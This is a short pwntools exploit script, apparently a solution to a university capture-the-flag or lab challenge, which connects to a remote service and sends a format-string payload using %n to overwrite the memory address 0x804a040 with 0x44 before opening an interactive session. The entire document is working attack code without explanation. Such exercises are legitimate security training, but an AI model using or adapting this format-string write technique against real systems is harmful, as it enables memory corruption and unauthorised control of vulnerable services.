from pwn import *

# P = process("./bin")
P = remote("mustard.stt.rnl.tecnico.ulisboa.pt", 10053)

target = 0x804a040
value = 0x44

payload = p32(target) + b"%08x."*5 + b"%19x%n"

P.sendline(payload)
print(68 - 62 + 13)
print(value)
P.interactive()